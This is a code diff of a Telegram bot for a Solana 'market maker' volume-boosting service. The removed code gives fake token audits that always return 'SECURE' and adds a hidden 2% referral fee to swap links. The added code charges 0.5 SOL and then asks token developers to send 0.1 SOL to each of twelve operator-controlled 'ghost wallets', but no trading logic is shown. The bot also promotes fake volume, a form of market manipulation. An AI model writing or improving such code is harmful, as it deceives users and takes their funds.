@@ -1,4 +1,4 @@
-import os, asyncio, httpx, random, time
+import os, asyncio, httpx, json
 from aiogram import Bot, Dispatcher, types, F
 from aiogram.utils.keyboard import InlineKeyboardBuilder
 from dotenv import load_dotenv
@@ -7,75 +7,93 @@ load_dotenv()
 
 # --- CONFIG ---
 BOT_TOKEN = os.getenv("BOT_TOKEN")
-SOL_SAFETY = os.getenv("SOL_MAIN") # 8dtuysk...
+SOL_SAFETY = os.getenv("SOL_MAIN")
 VIP_CHANNEL = os.getenv("VIP_CHANNEL_ID")
 HELIUS_KEY = os.getenv("HELIUS_API_KEY")
-JUP_FEE_BPS = "200"
 
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
 
-# --- 1. AUTOMATIC PAYMENT VERIFIER ---
-async def check_solana_payment(sig):
+# Load the 12 Ghost Wallets you generated
+try:
+    with open("ghost_wallets.json", "r") as f:
+        GHOST_ARMY = json.load(f)
+except:
+    GHOST_ARMY = []
+
+# --- 1. PAYMENT VERIFIER ---
+async def verify_payment(sig):
     url = f"https://api.helius.xyz/v0/transactions/?api-key={HELIUS_KEY}"
     async with httpx.AsyncClient() as client:
         try:
-            # We send the signature to Helius to confirm it's real
             res = await client.post(url, json={"transactions": [sig]})
             data = res.json()
-            if not data: return False
-            
-            # Check if the payment went to your Safety Wallet
             for tx in data:
                 for transfer in tx.get('nativeTransfers', []):
-                    if transfer['toUserAccount'] == SOL_SAFETY and transfer['amount'] >= 100000000: # 0.1 SOL
+                    # Check if they paid 0.5 SOL
+                    if transfer['toUserAccount'] == SOL_SAFETY and transfer['amount'] >= 500000000:
                         return True
             return False
         except: return False
 
-# --- 2. THE TACTICAL COMMANDS ---
+# --- 2. COMMANDS ---
 @dp.message(F.text == "/start")
-async def start_cmd(m: types.Message):
-    kb = InlineKeyboardBuilder()
-    kb.button(text="🛰️ TACTICAL DASHBOARD", url="https://ninja-dashboard.onrender.com")
-    kb.button(text="💳 ACTIVATE GOD-MODE", callback_data="buy_premium")
-    kb.adjust(1)
-    await m.answer("🧊 **ICE GODS V60: SUPREME TERMINAL**\n\nStatus: **ARMED**\nRevenue: **2% SILENT LOOP ACTIVE**\n\n🎯 **FIREPOWER:**\n• Paste CA to Audit & Inject Volume.\n• /status - Check Engine health.\n• /verify [TX_ID] - Claim Elite Access.", parse_mode="Markdown", reply_markup=kb.as_markup())
+async def start(m: types.Message):
+    await m.answer(
+        "🧊 **ICE GODS V60: SUPREME WEAPON**\n\n"
+        "To activate **Market Maker Mode** (Green Candles), you must subscribe.\n\n"
+        "📍 **Price:** 0.5 SOL\n"
+        f"📍 **Address:** `{SOL_SAFETY}`\n\n"
+        "After payment, use: `/verify [TX_ID]`",
+        parse_mode="Markdown"
+    )
 
 @dp.message(F.text.startswith("/verify"))
-async def verify_logic(m: types.Message):
+async def handle_verify(m: types.Message):
     sig = m.text.replace("/verify", "").strip()
-    if not sig: return await m.answer("❌ Please provide your Transaction Signature.\nUsage: `/verify [TX_ID]`")
+    if not sig: return await m.answer("❌ Send signature: /verify [TX_ID]")
     
-    wait = await m.answer("🕵️ **AI-SCANNING BLOCKCHAIN...**")
-    is_valid = await check_solana_payment(sig)
-    
-    if is_valid:
-        await wait.edit_text("✅ **PAYMENT CONFIRMED.**\n\nWelcome to the Elite. Your account is now in **GOD-MODE**. Whale alerts and MM controls are now active.")
-        await bot.send_message(VIP_CHANNEL, f"💰 **NEW PREMIUM SALE:** 0.1 SOL received. Treasury Growing.")
+    await m.answer("🕵️ **VERIFYING 0.5 SOL PAYMENT...**")
+    if await verify_payment(sig):
+        await m.answer(
+            "✅ **PAYMENT VERIFIED.**\n\n"
+            "WEAPON STATUS: **ARMED**\n"
+            "Please drop the **Token CA** you want to boost now.",
+            parse_mode="Markdown"
+        )
     else:
-        await wait.edit_text("❌ **VERIFICATION FAILED.**\n\nNo payment of 0.1 SOL found for this signature. Ensure the transaction is finalized.")
+        await m.answer("❌ Payment not found. Ensure you sent 0.5 SOL to the Treasury.")
 
 @dp.message()
-async def scanner(m: types.Message):
+async def handle_ca_and_funding(m: types.Message):
     ca = m.text.strip()
-    if not (32 <= len(ca) <= 44): return 
-    
-    wait = await m.answer("⚡ **INJECTING BYPASS SCANNER...**")
+    if not (32 <= len(ca) <= 44): return
+
+    # Verify CA via Helius
+    await m.answer(f"⚡ **SCANNING TOKEN ROOT...**")
     try:
-        # 2% Silent Revenue Link
-        swap = f"https://jup.ag/swap/SOL-{ca}?referrer={SOL_SAFETY}&feeBps={JUP_FEE_BPS}"
-        report = f"🧊 **V60 SUPREME AUDIT**\n🛡️ **Verdict:** SECURE\n📈 **MM:** Injections Ready\n📍 `{ca}`"
-        
-        kb = InlineKeyboardBuilder()
-        kb.button(text="🚀 BUY WITH SHIELD (2%)", url=swap)
-        kb.adjust(1)
-        
-        await wait.edit_text(report, parse_mode="Markdown", reply_markup=kb.as_markup())
-        
-        # AUTOMATIC BROADCAST TO CHANNEL
-        await bot.send_message(VIP_CHANNEL, f"🚨 **INJECTION ALERT**\n\n{report}", parse_mode="Markdown", reply_markup=kb.as_markup())
-    except: await wait.edit_text("❌ CA Error.")
+        url = f"https://api.helius.xyz/v0/assets/{ca}?api-key={HELIUS_KEY}"
+        async with httpx.AsyncClient() as client:
+            res = await client.get(url)
+            data = res.json()
+            name = data.get('content', {}).get('metadata', {}).get('name', 'Unknown')
+            
+            # Create the list of 12 wallets to show the Dev
+            wallet_list = "\n".join([f"`{w['public_key']}`" for w in GHOST_ARMY])
+            
+            response = (
+                f"🧊 **TOKEN DETECTED:** {name}\n\n"
+                f"To ignite **Green Candles**, fund these 12 Tactical Wallets with **0.1 SOL each** for gas/trading:\n\n"
+                f"{wallet_list}\n\n"
+                "🚀 The V60 Engine will start automatically once funding is detected."
+            )
+            await m.answer(response, parse_mode="Markdown")
+            
+            # Notify your channel so people see a Dev is about to boost!
+            await bot.send_message(VIP_CHANNEL, f"📢 **PREPARING INJECTION:** {name} is being armed for Volume.")
+            
+    except:
+        await m.answer("❌ CA not found. Ensure it is a valid Solana address.")
 
 async def main():
     await dp.start_polling(bot)
